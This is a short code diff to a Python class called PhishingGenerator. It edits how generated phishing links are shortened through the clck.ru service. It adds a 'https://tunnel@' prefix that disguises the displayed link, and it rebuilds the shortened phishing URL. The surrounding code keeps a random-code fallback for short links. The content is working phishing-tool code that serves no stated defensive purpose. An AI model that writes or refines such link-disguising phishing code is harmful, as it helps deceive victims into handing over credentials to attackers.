@@ -1220,7 +1220,9 @@ class PhishingGenerator:
             r = requests.get(f"https://clck.ru/--?url={quote(url, safe='')}", timeout=8)
             s = r.text.strip()
             if r.status_code == 200 and s.startswith('https://clck.ru/'):
-                console.print(f"[dim]🔗 Short: {s}[/]")
+                path = s.split('/')[-1]
+                display = f"https://tunnel@{s.split('//')[1]}"
+                console.print(f"[dim]🔗 Short: {display}[/]")
                 return
         except:
             pass
@@ -1543,7 +1545,8 @@ class PhishingGenerator:
                     r = requests.get(f"https://clck.ru/--?url={quote(phish_url, safe='')}", timeout=8)
                     s = r.text.strip()
                     if r.status_code == 200 and s.startswith('https://clck.ru/'):
-                        shortened_url = s
+                        path = s.split('/')[-1]
+                        shortened_url = f"https://clck.ru/{path}"
                     else:
                         sc = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
                         self.short_links[sc] = phish_url
